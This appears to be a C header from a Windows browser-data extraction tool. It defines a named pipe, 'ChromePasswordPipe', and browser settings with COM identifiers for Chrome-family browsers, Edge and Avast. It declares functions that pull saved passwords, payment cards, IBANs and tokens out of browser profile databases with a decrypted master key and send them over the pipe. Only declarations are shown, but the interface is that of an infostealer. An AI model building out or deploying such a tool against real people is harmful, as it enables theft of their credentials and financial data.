#pragma once

#include <Windows.h>
#include "Libs\sqlite3.h"
#include "Memory\Memory.h"

#define PIPE_NAME "\\\\.\\pipe\\ChromePasswordPipe"

typedef enum {
    Protect_None = 0,
    Protect_PathOld = 1,
    Protect_Path = 2,
    Protect_Max = 3
} ProtectLevel;

typedef struct {
    const char* name;
    const char* userDataSubPath;
    GUID clsid;
    GUID iid;
    GUID iid_v2;
    BOOL has_v2;
    BOOL isEdge;
    BOOL isAvast;
} BrowserCfg;

typedef struct {
    sqlite3* db;
} DbHandle;

extern HANDLE g_pipe;
extern BrowserCfg g_browser;

void SendPipe(const char* data);
void SendPipeFmt(const char* fmt, ...);
void GetAppDataPath(char* buffer, DWORD size);
BOOL CopyFileRetry(const char* src, const char* dest);

void ExtractPasswords(const char* dbPath, const BYTE* masterKey, DWORD masterKeyLen);
void ExtractCards(const char* dbPath, const BYTE* masterKey, DWORD masterKeyLen);
void ExtractIbans(const char* dbPath, const BYTE* masterKey, DWORD masterKeyLen);
void ExtractTokens(const char* dbPath, const BYTE* masterKey, DWORD masterKeyLen);
void ProcessProfiles(const BYTE* masterKey, DWORD masterKeyLen);
